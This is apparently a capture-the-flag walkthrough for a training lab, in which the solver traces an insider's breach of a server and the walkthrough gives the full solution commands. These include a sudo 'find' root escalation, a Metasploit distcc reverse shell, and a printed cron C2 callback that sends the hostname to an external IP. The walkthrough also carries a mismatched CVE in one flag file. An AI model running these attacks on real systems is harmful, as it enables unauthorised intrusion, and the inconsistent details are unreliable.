# 🔍 Walkthrough — Operation: ZERO

> Three levels of guidance for every flag. Use only what you need.  
> **Nudge** → you're close, just redirected. **Push** → the right tool and direction. **Solution** → full step-by-step with expected output.

---

## How to Use This Walkthrough

Each flag has three collapsible hint tiers. Work through them in order — resist jumping straight to the solution. The investigation is designed to build on itself, and understanding *why* each step works is the point.

| Tier | What it gives you |
|------|-------------------|
| 💬 **Nudge** | A conceptual redirect — confirms you're in the right area or points you to the right category of technique |
| 📌 **Push** | The specific tool or file, without the exact command |
| ✅ **Solution** | Full commands, expected output, and the flag location |

> ⚠️ **Flag codes are shown in the Solution tier.** If this is for student use and you want the codes hidden, stop at the Push tier.

---

## Before You Start

Make sure you have completed the environment setup:

```bash
# Discover the target IP — do this first, every session
nmap -sn 192.168.100.0/24
```

Note the target IP — it is referred to as `<TARGET_IP>` throughout this document.

---

## Table of Contents

- [Act 1 — Reconnaissance](#act-1--reconnaissance)
  - [F01 — The Server Announces Itself](#f01--the-server-announces-itself)
  - [F02 — Robots Tell All](#f02--robots-tell-all)
  - [F03 — Left in the Source Code](#f03--left-in-the-source-code)
- [Act 2 — Archive Extraction](#act-2--archive-extraction)
  - [F04 — The Backup Nobody Secured](#f04--the-backup-nobody-secured)
  - [F05 — The Slack Export Speaks](#f05--the-slack-export-speaks)
  - [F06 — Credentials in Plain Text](#f06--credentials-in-plain-text)
- [Act 3 — Initial Access](#act-3--initial-access)
  - [F07 — Through the Front Door](#f07--through-the-front-door)
  - [F08 — The History Never Lies](#f08--the-history-never-lies)
- [Act 4 — File Forensics](#act-4--file-forensics)
  - [F09 — The Note He Shouldn't Have Left](#f09--the-note-he-shouldnt-have-left)
  - [F10 — Metadata Leaves Marks](#f10--metadata-leaves-marks)
  - [F11 — The Ticking Backdoor](#f11--the-ticking-backdoor)
  - [F12 — The Config File Confesses](#f12--the-config-file-confesses)
- [Act 5 — Privilege Escalation](#act-5--privilege-escalation)
  - [F13 — Least Privilege, Ignored](#f13--least-privilege-ignored)
  - [F14 — Find Your Way to Root](#f14--find-your-way-to-root)
  - [F15 — GhostOps Left a Backdoor](#f15--ghostops-left-a-backdoor)
- [Act 6 — Identity Exposure](#act-6--identity-exposure)
  - [F16 — GhostOps Unmasked](#f16--ghostops-unmasked)
- [Act 7 — Data Recovery](#act-7--data-recovery)
  - [F17 — Recovering What Was Taken](#f17--recovering-what-was-taken)
- [Bonus Challenges](#bonus-challenges)
  - [BF01 — Broken Access Control](#bf01--broken-access-control)
  - [BF02 — Hidden Staging Directory](#bf02--hidden-staging-directory)
  - [BF03 — Zero Trust Failure](#bf03--zero-trust-failure)
  - [BF04 — CIA Triad Violation](#bf04--cia-triad-violation)
  - [BF05 — IDOR Parameter Tampering](#bf05--idor-parameter-tampering)
  - [BF06 — Encoded Data](#bf06--encoded-data)
- [Real-World Mitigations Summary](#real-world-mitigations-summary)

---

## Act 1 — Reconnaissance

> *The server is online. It communicates before you identify yourself. The web server has a public face — and a hidden one.*

---

### F01 — The Server Announces Itself

**Difficulty:** Easy  
**Technique:** Service banner reading

---

<details>
<summary>💬 Nudge</summary>

Every service announces itself before authentication. SSH banners appear the moment a connection is made — before any credentials are exchanged. You don't need to log in to read it.

Try touching port 22 directly.

</details>

---

<details>
<summary>📌 Push</summary>

Use `ssh` or `nc` to connect to port 22 on the target. The flag is in the pre-authentication banner text — it appears immediately on connection, before any password prompt.

Tool: `nc` or `ssh`  
Port: `22`

</details>

---

<details>
<summary>✅ Solution</summary>

```bash
# Step 1 — Discover the target IP
nmap -sn 192.168.100.0/24

# Step 2 — Full service scan
nmap -sV <TARGET_IP>

# Step 3 — Read the SSH banner directly
ssh <TARGET_IP>
# OR
nc <TARGET_IP> 22
```

**Expected output:**

```
ZeroTrust Solutions — Secure Server
Authorised access only. All sessions are monitored.
Zero Trust. Always Verify.
HB-SCAN-1337
— ZeroTrust IT Operations
```

**Flag:** `HB-SCAN-1337`  
**Location:** `/etc/ssh/banner.txt` — served by SSH before authentication

**Real-world mitigation:** Remove or sanitise SSH banners after staff changes. Banners should never contain internal identifiers. Audit `/etc/ssh/sshd_config` regularly.

</details>

---

### F02 — Robots Tell All

**Difficulty:** Easy  
**Technique:** Web reconnaissance

---

<details>
<summary>💬 Nudge</summary>

There is a standard file that websites use to tell search engine crawlers which directories to avoid indexing. The irony is that this file is completely public — and it often points directly to the most sensitive directories on the server.

Check the web server's public root.

</details>

---

<details>
<summary>📌 Push</summary>

Request `/robots.txt` from the target web server. Look carefully at both the `Disallow:` entries and any comment lines beginning with `#`.

Tool: `curl`  
Path: `/robots.txt`

</details>

---

<details>
<summary>✅ Solution</summary>

```bash
curl http://<TARGET_IP>/robots.txt
```

**Expected output:**

```
User-agent: *
Disallow: /backup/
Disallow: /admin/

# HB-ROBOT-2448
# ZeroTrust Solutions — Internal Server
```

**Flag:** `HB-ROBOT-2448`  
**Bonus:** Note the `Disallow: /backup/` entry — this is the path you need for Act 2.

**Real-world mitigation:** Never list sensitive directories in `robots.txt`. Sensitive paths require authentication, not crawl exclusion rules.

</details>

---

### F03 — Left in the Source Code

**Difficulty:** Easy  
**Technique:** HTML source inspection

---

<details>
<summary>💬 Nudge</summary>

Web pages often contain developer notes that are invisible when rendered in a browser but fully readable in the raw HTML. A TODO comment that was never removed made it all the way to production.

View the raw HTML — not the rendered page.

</details>

---

<details>
<summary>📌 Push</summary>

Use `curl` to retrieve the portal page and read the raw HTML output. Look for HTML comment tags: `<!-- ... -->`. Jordan left a note he never cleaned up.

Tool: `curl`  
Path: `/portal/`

</details>

---

<details>
<summary>✅ Solution</summary>

```bash
curl http://<TARGET_IP>/portal/
```

**Expected output (relevant line):**

```html
<!-- TODO: remove /backup/ before production | HB-SOURCE-3559 -->
```

**Flag:** `HB-SOURCE-3559`  
**Location:** HTML comment in `/var/www/html/portal/index.html`

**Real-world mitigation:** Implement a pre-deployment checklist that strips all HTML comments. Use automated scanners such as OWASP ZAP to detect comment leakage before release.

</details>

---

## Act 2 — Archive Extraction

> *Something was left reachable that should not have been. Inside it: deployment records, internal communications, credentials.*

---

### F04 — The Backup Nobody Secured

**Difficulty:** Easy  
**Technique:** Exposed directory / archive extraction

---

<details>
<summary>💬 Nudge</summary>

You already know which directory was left reachable — `robots.txt` told you. The directory has no authentication. Navigate there and see what was left behind.

</details>

---

<details>
<summary>📌 Push</summary>

Browse to `/backup/` — directory listing is enabled. Download the zip archive you find there, extract it, and read every file that comes out.

Tools: `wget`, `unzip`, `cat`

</details>

---

<details>
<summary>✅ Solution</summary>

```bash
# Step 1 — Confirm directory listing
curl http://<TARGET_IP>/backup/

# Step 2 — Download the archive
wget http://<TARGET_IP>/backup/prod_backup_final_v3.zip

# Step 3 — Extract
unzip prod_backup_final_v3.zip

# Step 4 — Read the deployment notes
cat deployment_notes.txt
```

**Expected output (relevant line):**

```
Backup Reference: HB-BACKUP-4673
```

**Flag:** `HB-BACKUP-4673`  
**Location:** `deployment_notes.txt` inside `prod_backup_final_v3.zip`

**Real-world mitigation:** Never store deployment backups in web-accessible directories. Backups must live outside the web root and require authentication.

</details>

---

### F05 — The Slack Export Speaks

**Difficulty:** Easy  
**Technique:** JSON analysis / OSINT

---

<details>
<summary>💬 Nudge</summary>

The archive contains more than one file. Internal communications have a habit of surviving long after they were meant to. Someone exported their team channel and dropped it into this archive without thinking.

Read every file that came out of the zip.

</details>

---

<details>
<summary>📌 Push</summary>

Read `slack_export.json`. Look at every message in the `messages` array. One of them contains an alias that will become important later — note it down alongside the flag.

Tool: `cat` or `grep`

</details>

---

<details>
<summary>✅ Solution</summary>

```bash
cat slack_export.json
```

**Expected output:**

```json
{"channel":"devops-general","messages":[
{"user":"jmercer","text":"FYI backup still on /backup/ - will clean up","ts":"1738000001"},
{"user":"jmercer","text":"credentials same as config.env for now","ts":"1738000242"},
{"user":"jmercer","text":"GhostOps was here. HB-SLACK-5784","ts":"1738001337"}
]}
```

**Flag:** `HB-SLACK-5784`  
**Note:** Record the alias `GhostOps` — this is the first identity link in the investigation.  
**Note:** The message `credentials same as config.env` is a direct pointer to F06.

**Real-world mitigation:** Never include communication exports in deployment archives. Implement DLP controls and regularly audit backup contents before storage.

</details>

---

### F06 — Credentials in Plain Text

**Difficulty:** Easy  
**Technique:** Credential extraction from config file

---

<details>
<summary>💬 Nudge</summary>

Configuration files exist to make deployment easier. This one stores credentials that should have been rotated long ago. The Slack export told you exactly where to look.

</details>

---

<details>
<summary>📌 Push</summary>

Read `config.env`. The flag is on a comment line beginning with `#`. The credentials stored here are what you need for Act 3 — record them carefully.

Tool: `cat`

</details>

---

<details>
<summary>✅ Solution</summary>

```bash
cat config.env
```

**Expected output:**

```
# ZeroTrust Application Environment Config
# DO NOT COMMIT TO PUBLIC REPO
# HB-CREDS-6895
DEV_USER=devops
DEV_PASS=ZTsecure2024!
APP_ENV=production
SECRET_KEY=zt_1ntern4l_k3y_2026
```

**Flag:** `HB-CREDS-6895`  
**Credentials to save:** `devops` / `ZTsecure2024!` — required for F07.

**Real-world mitigation:** Never hardcode credentials in configuration files. Use a secrets manager. Rotate all credentials immediately when an exposed archive is discovered.

</details>

---

## Act 3 — Initial Access

> *Jordan's account was never locked. His session history was never cleared. Walk in through the door he left open.*

---

### F07 — Through the Front Door

**Difficulty:** Easy  
**Technique:** SSH login with discovered credentials

---

<details>
<summary>💬 Nudge</summary>

You have a username and a password. The SSH service is open. The account was never locked after Jordan was terminated.

Walk in.

</details>

---

<details>
<summary>📌 Push</summary>

SSH into the target using the credentials from `config.env`. Once inside, list all files in the home directory — including hidden ones. The flag is in a dotfile.

Tool: `ssh`, `ls -la`, `cat`

</details>

---

<details>
<summary>✅ Solution</summary>

```bash
# Step 1 — SSH in
ssh devops@<TARGET_IP>
# Password: ZTsecure2024!

# Step 2 — Confirm identity
whoami
hostname

# Step 3 — List all home directory files including hidden
ls -la

# Step 4 — Read the flag file
cat .flag_access.txt
```

**Expected output:**

```
ZeroTrust Solutions — SSH Access Confirmation
Account: devops  |  Date: Feb 2026
Access granted. Zero Trust? Not quite.
HB-SHELL-7906
```

**Flag:** `HB-SHELL-7906`

**Real-world mitigation:** Revoke all SSH access for terminated employees immediately. Implement a leaver checklist completed before the employee's final day. Rotate all credentials the account had access to.

</details>

---

### F08 — The History Never Lies

**Difficulty:** Easy  
**Technique:** Shell history forensics

---

<details>
<summary>💬 Nudge</summary>

The terminal remembers every command that was run. Jordan didn't think anyone would ever sit in his chair and read the transcript. He left more than one thing behind in here.

Look carefully — there is a passphrase in this file that you will need for a later challenge.

</details>

---

<details>
<summary>📌 Push</summary>

Read `.bash_history`. Look for any command with a `-P` flag — that reveals a passphrase. Also note any `sudo` commands — they confirm the escalation path you will use in Act 5.

Tool: `cat`  
File: `/home/devops/.bash_history`

</details>

---

<details>
<summary>✅ Solution</summary>

```bash
cat /home/devops/.bash_history
```

**Expected output:**

```
ls -la
cd /var/www/html/backup
cat deployment_notes.txt
cd ~
zip -P zt_ghost_2024 ghost_archive.zip sudoers_update.txt
sudo find / -name '*.env' 2>/dev/null
sudo -l
sudo find . -exec /bin/sh \; -quit
# HB-HIST-8017
exit
```

**Flag:** `HB-HIST-8017` (on the `#` comment line)  
**Passphrase to note:** `zt_ghost_2024` (the `-P` argument — used in a later bonus challenge)  
**Escalation path confirmed:** `sudo find . -exec /bin/sh \; -quit` — this is the GTFOBins technique you will use in F14.

**Real-world mitigation:** Set `HISTFILE=/dev/null` or `HISTSIZE=0` for service accounts. Restrict `.bash_history` to `chmod 600`. Use session logging via `auditd` rather than shell history.

</details>

---

## Act 4 — File Forensics

> *The home directory holds more than files. Notes, images, scheduled tasks, configuration fragments — each one a piece of the picture.*

---

### F09 — The Note He Shouldn't Have Left

**Difficulty:** Medium  
**Technique:** File enumeration

---

<details>
<summary>💬 Nudge</summary>

Jordan wrote himself a note about a rule he added to the system — something he called temporary. The system still honours it. The note is still there.

Check what else is in the home directory beyond hidden files.

</details>

---

<details>
<summary>📌 Push</summary>

List all files in `/home/devops/`. There is a plaintext file documenting a sudo rule Jordan added and never removed. Read it — it confirms the escalation path for Acts 5 and 6.

Tool: `ls -la`, `cat`  
File: `sudoers_update.txt`

</details>

---

<details>
<summary>✅ Solution</summary>

```bash
ls -la /home/devops/
cat /home/devops/sudoers_update.txt
```

**Expected output:**

```
ZeroTrust — Sudo Update Notes (Jordan Mercer)
============================================
HB-NOTES-9128
Added rule: devops ALL=(ALL) NOPASSWD: /usr/bin/find
Reason: needed for deployment scripts — TODO: restrict to specific path
Date: Jan 2026
```

**Flag:** `HB-NOTES-9128`  
**Key finding:** `devops ALL=(ALL) NOPASSWD: /usr/bin/find` — the misconfigured sudo rule that enables F14.

**Real-world mitigation:** Never document misconfigured rules in user-accessible files. Conduct quarterly privilege audits. Implement change management for any sudoers modifications.

</details>

---

### F10 — Metadata Leaves Marks

**Difficulty:** Medium  
**Technique:** EXIF metadata analysis

---

<details>
<summary>💬 Nudge</summary>

Files carry invisible luggage. When Jordan exported this image from his personal machine, the software embedded information alongside the pixels — information that remembers where the file came from and who created it.

There is an image file in the home directory. Inspect it with the right tool.

</details>

---

<details>
<summary>📌 Push</summary>

Use `exiftool` against the PNG file in `/home/devops/`. Scroll through all fields — look specifically at `Comment`, `Artist`, and `Copyright`. The email address you find here is forensic evidence. Record it.

Tool: `exiftool`  
File: `zt_architecture_diagram.png`

</details>

---

<details>
<summary>✅ Solution</summary>

```bash
exiftool /home/devops/zt_architecture_diagram.png
```

**Expected output (relevant fields):**

```
Artist                          : Jordan Mercer
Copyright                       : ZeroTrust Solutions Internal
Comment                         : j.mercer.ghostops@protonmail.com | HB-META-0239
```

**Flag:** `HB-META-0239`  
**Forensic evidence:** `j.mercer.ghostops@protonmail.com` — Jordan's personal ProtonMail address. Second identity link in the investigation (first was the `GhostOps` alias in F05).

**Real-world mitigation:** Strip metadata from all files before sharing using `mat2` or `exiftool -all= filename`. Implement automated metadata stripping in document publishing workflows.

</details>

---

### F11 — The Ticking Backdoor

**Difficulty:** Medium  
**Technique:** Cron job inspection

---

<details>
<summary>💬 Nudge</summary>

Persistence is the attacker's most valuable tool. When a front door closes, they make sure another door opens on a schedule. Something on this server runs at regular intervals — whether Jordan is logged in or not.

Check the scheduled task directories.

</details>

---

<details>
<summary>📌 Push</summary>

List all files in `/etc/cron.d/`. There is a file that does not belong. Read it — look for a `curl` command reaching out to an external IP, and find the flag embedded as a comment line.

Tool: `ls`, `cat`  
Directory: `/etc/cron.d/`

</details>

---

<details>
<summary>✅ Solution</summary>

```bash
ls /etc/cron.d/
cat /etc/cron.d/zt_health_check
```

**Expected output:**

```
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# ZeroTrust health monitoring — do not remove
# HB-CRON-1340
*/30 * * * * root curl -s "http://185.220.101.47/hc.php?h=$(hostname)" > /dev/null 2>&1
```

**Flag:** `HB-CRON-1340`  
**Key finding:** C2 callback to `185.220.101.47` every 30 minutes. The connection silently fails because the VM has no internet route — but the cron job proves the intent.

**Real-world mitigation:** Audit `/etc/cron.d/` regularly. Implement File Integrity Monitoring (FIM) on `/etc/` with alerting for new cron files. Use `rkhunter` or `AIDE` to detect unexpected cron installations.

</details>

---

### F12 — The Config File Confesses

**Difficulty:** Medium  
**Technique:** World-readable configuration file

---

<details>
<summary>💬 Nudge</summary>

Not all sensitive files live in obvious places. Jordan assumed he would always be the only one with shell access. A configuration file in `/etc/` is readable by everyone — and it shouldn't be.

</details>

---

<details>
<summary>📌 Push</summary>

Check `/etc/` for application environment files. Look for a file with `644` permissions (world-readable) that contains database credentials. The flag is on a comment line inside it.

Tool: `ls -la`, `cat`  
File: `/etc/zt_app.env`

</details>

---

<details>
<summary>✅ Solution</summary>

```bash
# Check permissions first
ls -la /etc/zt_app.env
# Expected: -rw-r--r-- (644 — world readable)

cat /etc/zt_app.env
```

**Expected output:**

```
# ZeroTrust App Configuration — /etc/zt_app.env
# HB-CONF-2451
DB_HOST=localhost
DB_PORT=3306
DB_NAME=zt_production
DB_USER=zt_app
DB_PASS=ZTdb_s3cure!
API_KEY=zt_api_k3y_2026
```

**Flag:** `HB-CONF-2451`

**Real-world mitigation:** Set all config files containing secrets to `chmod 600` owned by the service account. Use `systemd EnvironmentFile` with restricted permissions. Implement a secrets scanner in your CI/CD pipeline.

</details>

---

## Act 5 — Privilege Escalation

> *Two paths to root. One was built into the system by misconfiguration. The other was installed deliberately. Jordan used both.*

---

### F13 — Least Privilege, Ignored

**Difficulty:** Medium  
**Technique:** Sudo enumeration

---

<details>
<summary>💬 Nudge</summary>

Trust is a configuration. Ask the system what elevated permissions it has granted to this account. It will tell you — along with something else you haven't seen yet.

</details>

---

<details>
<summary>📌 Push</summary>

Run `sudo -l` as the `devops` user. Read everything that appears — including any notice or warning that is displayed before the privilege list. The flag is in that notice.

Tool: `sudo -l`

</details>

---

<details>
<summary>✅ Solution</summary>

```bash
sudo -l
```

**Expected output:**

```
ZeroTrust Solutions — Privilege Access Warning
You are about to use elevated privileges. All actions are logged.
Compliance Reference: HB-SUDO-3562
Configured by: J. Mercer (devops) — Jan 2026

User devops may run the following commands on victim01:
    (ALL) NOPASSWD: /usr/bin/find
```

**Flag:** `HB-SUDO-3562` (in the compliance notice)  
**Key finding:** `(ALL) NOPASSWD: /usr/bin/find` — this is the GTFOBins escalation path used in F14.

**Real-world mitigation:** Never grant `NOPASSWD` sudo for any binary listed on GTFOBins. Run regular privilege audits with `sudo -l` across all accounts.

</details>

---

### F14 — Find Your Way to Root

**Difficulty:** Hard  
**Technique:** GTFOBins privilege escalation via `find`

---

<details>
<summary>💬 Nudge</summary>

You know the misconfigured rule. You know the binary. GTFOBins documents exactly what can be done when a binary like this is granted passwordless sudo. Jordan ran this exact command himself — you saw it in his history.

</details>

---

<details>
<summary>📌 Push</summary>

Use the GTFOBins exploitation technique for `/usr/bin/find` with `sudo`. Once you have a root shell, confirm it with `whoami` or `id`, then retrieve the flag from `/root/`.

Reference: `https://gtfobins.github.io/gtfobins/find/`  
File: `/root/board_memo.txt`

</details>

---

<details>
<summary>✅ Solution</summary>

```bash
# Step 1 — Escalate to root via GTFOBins find technique
sudo find . -exec /bin/sh \; -quit

# Step 2 — Confirm root access
whoami
# Expected: root

id
# Expected: uid=0(root) gid=0(root) groups=0(root)

# Step 3 — Read the flag
cat /root/board_memo.txt
```

**Expected output:**

```
ZeroTrust Solutions — Board Memorandum (CONFIDENTIAL)
Re: Q4 2025 Security Review
This file confirms full administrative access was obtained during breach.
Evidence: HB-PRIV-4673
```

**Flag:** `HB-PRIV-4673`

**Real-world mitigation:** Immediately remove `NOPASSWD` sudo grants for any GTFOBins binary. Implement AppArmor or SELinux profiles to restrict `find`. Audit `/etc/sudoers` and `/etc/sudoers.d/` quarterly.

</details>

---

### F15 — GhostOps Left a Backdoor

**Difficulty:** Hard  
**Technique:** Metasploit exploit — CVE-2004-2687 (distcc)

---

<details>
<summary>💬 Nudge</summary>

Not all doors are on port 22. Jordan installed something on a non-standard port — a deliberate choice. He called it his ghost door in a message that survived in the archive. The software version he chose was not chosen by accident. It has a history.

Run a full port scan if you haven't already.

</details>

---

<details>
<summary>📌 Push</summary>

Scan for port 3632 — it runs a distributed build daemon called `distcc`. This version has a known CVE with a Metasploit module. The exploit lands a shell as the `daemon` user, not root. You will need to pivot: `daemon` → `devops` (using the credentials from F06) → `root` (using the `find` sudo rule from F14).

Tools: `nmap`, `msfconsole`  
Module: `exploit/unix/misc/distcc_exec`  
CVE: `CVE-2004-2687`

</details>

---

<details>
<summary>✅ Solution</summary>

```bash
# Step 1 — Confirm distcc is running
nmap -sV -p 3632 <TARGET_IP>
# Expected: distccd open

# Step 2 — Launch Metasploit
msfconsole -q

# Step 3 — Configure and run the exploit
use exploit/unix/misc/distcc_exec
set RHOSTS <TARGET_IP>
set LHOST 192.168.100.100
set payload cmd/unix/reverse
run
```

**Expected output:**

```
[*] Started reverse TCP handler on 192.168.100.100:4444
[*] Command shell session 1 opened
```

```bash
# Step 4 — Check current user (daemon, not root)
whoami
# Expected: daemon

# Step 5 — Upgrade to a proper shell
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Step 6 — Pivot to devops using discovered credentials
su devops
# Password: ZTsecure2024!

# Step 7 — Escalate to root via the sudo find rule
sudo find . -exec /bin/sh \; -quit

# Step 8 — Confirm root
whoami
# Expected: root

# Step 9 — Read the flag
cat /root/ghost_config.txt
```

**Expected output:**

```
GhostOps Backdoor Configuration
distcc build daemon — port 3632
Config: listens on 0.0.0.0 / allows 192.168.100.0/24
Installed: Feb 2026  |  CVE: 2011-2523
HB-GHOST-5784
```

**Flag:** `HB-GHOST-5784`  
**Chain:** `distcc exploit` → `daemon shell` → `su devops` → `sudo find` → `root`

**Real-world mitigation:** `distcc` must never listen on `0.0.0.0`. Restrict `ALLOWEDNETS` to specific build host IPs only, or disable distcc entirely when not in active use. Audit all listening services with `ss -tlnp` after any infrastructure change.

</details>

---

## Act 6 — Identity Exposure

> *With root access, nothing is hidden. Jordan thought this location was unreachable.*

---

### F16 — GhostOps Unmasked

**Difficulty:** Hard  
**Technique:** Root filesystem enumeration

---

<details>
<summary>💬 Nudge</summary>

Root access removes all remaining walls. Jordan stored something here convinced it was unreachable. Look for what he thought no one would ever find.

List everything in `/root/` — including hidden files.

</details>

---

<details>
<summary>📌 Push</summary>

Run `ls -la /root/` to see all files including hidden ones (files starting with `.`). There is a hidden file containing Jordan's full identity dossier. Read it and record every field — all of it is forensic evidence.

Tool: `ls -la`, `cat`  
File: `/root/.ghost_identity.txt`

</details>

---

<details>
<summary>✅ Solution</summary>

```bash
# Step 1 — List all root directory files including hidden
ls -la /root/

# Step 2 — Read the identity file
cat /root/.ghost_identity.txt
```

**Expected output:**

```
GhostOps Identity File
Real name: Jordan Mercer  |  Username: devops
Alias: GhostOps  |  Email: j.mercer.ghostops@protonmail.com
Forum: darkmarket.onion  |  Profile: ghostops_jm
HB-UNMASK-6895
```

**Flag:** `HB-UNMASK-6895`  
**Forensic evidence:** Full identity confirmed — Jordan Mercer, alias GhostOps, ProtonMail contact, darknet forum profile.

**Real-world mitigation:** Implement FIM on `/root/`. Set SIEM alerts for any new file creation under `/root/`. Forensically audit `/root/` immediately following any suspected breach.

</details>

---

## Act 7 — Data Recovery

> *The final act of the breach was not theft — it was alteration. Prove it happened. Recover what was changed.*

---

### F17 — Recovering What Was Taken

**Difficulty:** Hard  
**Technique:** File integrity comparison / data recovery

---

<details>
<summary>💬 Nudge</summary>

The last act of sabotage was not to steal — it was to alter. Numbers were changed. A record was removed. The kind of modification designed to create confusion. But backups are patient. They remember the original.

Find the backup copy and compare it to the live file.

</details>

---

<details>
<summary>📌 Push</summary>

The live client data file is at `/var/www/html/data/client_data.txt`. The original backup is in `/var/backup/`. Use `diff` to compare them. The flag is in the backup file on the final line.

Tools: `diff`, `cat`  
Files: `/var/www/html/data/client_data.txt` vs `/var/backup/zt_original/client_data.txt.bak`

</details>

---

<details>
<summary>✅ Solution</summary>

```bash
# Step 1 — Compare live file vs backup
diff /var/www/html/data/client_data.txt /var/backup/zt_original/client_data.txt.bak
```

**Expected diff output:**

```
2c2
< Client: Apex Financial       | Contract Value: 405000 | Signed: Jan 2025
---
> Client: Apex Financial       | Contract Value: 520000 | Signed: Jan 2025
2a3
> Client: BlueCore Holdings    | Contract Value: 1400000 | Signed: Jun 2025  [CONFIDENTIAL]
5c6
< Total: 875000
---
> Total: 2390000
```

```bash
# Step 2 — Read the original backup
cat /var/backup/zt_original/client_data.txt.bak
```

**Expected output:**

```
ZeroTrust Solutions — Client Data Register
==========================================
Client: Apex Financial       | Contract Value: 520000 | Signed: Jan 2025
Client: Meridian Tech        | Contract Value: 180000 | Signed: Mar 2025
Client: BlueCore Holdings    | Contract Value: 1400000 | Signed: Jun 2025  [CONFIDENTIAL]
Client: Pinnacle Group       | Contract Value: 290000 | Signed: Sep 2025
Total: 2390000
HB-RESTORE-7906
```

**Flag:** `HB-RESTORE-7906`  
**Tampering confirmed:**
- Apex Financial contract value reduced: `520,000` → `405,000`
- BlueCore Holdings entry removed entirely (contract value: `1,400,000`)
- Total adjusted to conceal the changes: `2,390,000` → `875,000`

**Real-world mitigation:** Implement FIM (AIDE, Tripwire) on all data files. Maintain immutable backups with cryptographic verification. Enable version control for critical data. Test backup integrity monthly.

</details>

---

## Bonus Challenges

> *Six optional challenges scattered across the web server. Not required for completion but worth additional marks. Find them through enumeration, curiosity, and looking where the main investigation doesn't take you.*

---

### BF01 — Broken Access Control

**Difficulty:** Easy Bonus  
**Concept:** OWASP A01:2021 — Broken Access Control

---

<details>
<summary>💬 Nudge</summary>

There is a user dashboard on the web server. It mentions an admin section. The application relies entirely on the URL to restrict access — there is no server-side check. What happens if you just navigate there directly?

</details>

---

<details>
<summary>📌 Push</summary>

Visit `/user/dashboard.html` first — read what it says about admin access. Then navigate directly to the admin path it references. No credentials required.

Tool: `curl`

</details>

---

<details>
<summary>✅ Solution</summary>

```bash
# Step 1 — Read the user dashboard
curl http://<TARGET_IP>/user/dashboard.html

# Step 2 — Navigate directly to the admin path
curl http://<TARGET_IP>/admin/reports.html
```

**Flag:** `HB-ACCESS-4456`

**Real-world mitigation:** Every server-side endpoint must independently verify user privileges. Never rely on the URL path alone to restrict access. Implement role-based access control (RBAC) at the application layer.

</details>

---

### BF02 — Hidden Staging Directory

**Difficulty:** Medium Bonus  
**Concept:** Directory enumeration / hidden paths

---

<details>
<summary>💬 Nudge</summary>

The web server contains more directories than `robots.txt` and the portal source revealed. There is a development staging environment that was never removed from the production server. It is not linked from any page.

You need a tool that can test thousands of directory names automatically.

</details>

---

<details>
<summary>📌 Push</summary>

Use `gobuster` to brute-force directories on the target web server. Use the `dirb` common wordlist. Look for a `/staging/` path in the results.

Tool: `gobuster`  
Wordlist: `/usr/share/wordlists/dirb/common.txt`

</details>

---

<details>
<summary>✅ Solution</summary>

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
```

**Look for:**

```
/staging              (Status: 200)
```

```bash
curl http://<TARGET_IP>/staging/
```

**Flag:** `HB-HIDDEN-7234`

**Real-world mitigation:** Remove all staging environments from production servers before deployment. Never deploy staging to the same host as production.

</details>

---

### BF03 — Zero Trust Failure

**Difficulty:** Medium Bonus  
**Concept:** Zero Trust principle — implicit trust in internal systems

---

<details>
<summary>💬 Nudge</summary>

An internal script is being served over HTTP with no authentication. It was designed for automated deployments under the assumption that anything accessing it must be a trusted internal system. That assumption is the vulnerability.

You may have already found this directory via `gobuster`.

</details>

---

<details>
<summary>📌 Push</summary>

Find the `/internal/` directory. List its contents and request the shell script you find there directly via `curl`. Note both the flag and the credentials the script exposes.

Tool: `curl`  
Path: `/internal/`

</details>

---

<details>
<summary>✅ Solution</summary>

```bash
# Step 1 — Discover via gobuster (if not already found)
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt

# Step 2 — List the internal directory
curl http://<TARGET_IP>/internal/

# Step 3 — Read the script
curl http://<TARGET_IP>/internal/auto_login.sh
```

**Flag:** `HB-ZEROTRUST-7789`

**Real-world mitigation:** Internal scripts must never be served over unauthenticated HTTP. Implement mutual TLS or token-based authentication for all internal service endpoints.

</details>

---

### BF04 — CIA Triad Violation

**Difficulty:** Easy Bonus  
**Concept:** CIA Triad — Confidentiality

---

<details>
<summary>💬 Nudge</summary>

A directory named `/public/` sounds harmless. But what was placed inside it is anything but. The name suggested it was meant to be accessible — the contents were not.

</details>

---

<details>
<summary>📌 Push</summary>

Navigate to `/public/` and read `data_dump.txt`. Note the client data exposed here and the flag in the file. This file also contains content you will need for BF06.

Tool: `curl`  
Path: `/public/data_dump.txt`

</details>

---

<details>
<summary>✅ Solution</summary>

```bash
# Step 1 — Browse the directory
curl http://<TARGET_IP>/public/

# Step 2 — Read the file
curl http://<TARGET_IP>/public/data_dump.txt
```

**Flag:** `HB-CIA-2024`

**Real-world mitigation:** Sensitive data must never be placed in a web-accessible directory. Implement access controls appropriate to the data classification. Conduct regular web root audits.

</details>

---

### BF05 — IDOR Parameter Tampering

**Difficulty:** Medium Bonus  
**Concept:** OWASP A01:2021 — Insecure Direct Object Reference

---

<details>
<summary>💬 Nudge</summary>

There is a user profile page that accepts an ID directly in the URL. The application returns data for whichever ID is supplied without checking whether the requesting user has permission to see it.

What happens when you change the number?

</details>

---

<details>
<summary>📌 Push</summary>

Visit `/user/profile.php?user_id=2`. Note the parameter in the URL and try different values — work downward toward zero. The admin account is at `user_id=0`.

Tool: `curl`

</details>

---

<details>
<summary>✅ Solution</summary>

```bash
# Step 1 — Normal user profile
curl 'http://<TARGET_IP>/user/profile.php?user_id=2'
# Returns: A. Singh — no flag

# Step 2 — Try user_id=1
curl 'http://<TARGET_IP>/user/profile.php?user_id=1'
# Returns: K. Walsh — no flag

# Step 3 — Try user_id=0
curl 'http://<TARGET_IP>/user/profile.php?user_id=0'
# Returns: Jordan Mercer — admin role
```

**Flag:** `HB-IDOR-6678`

**Real-world mitigation:** Never expose raw database IDs in URLs. Implement server-side authorisation checks on every object reference. Use session-mapped indirect references instead of raw IDs.

</details>

---

### BF06 — Encoded Data

**Difficulty:** Hard Bonus  
**Concept:** Data obfuscation — encoding is not encryption

---

<details>
<summary>💬 Nudge</summary>

In `data_dump.txt` there is a line near the bottom that looks nothing like the rest of the file. It does not belong. A string ending with `=` is often a sign of something that has been encoded. Try decoding it.

</details>

---

<details>
<summary>📌 Push</summary>

Find the unusual encoded string at the bottom of `data_dump.txt`. Decode it with `base64 -d`. The result is another encoded string. Decode that one too.

Tool: `echo`, `base64 -d`

</details>

---

<details>
<summary>✅ Solution</summary>

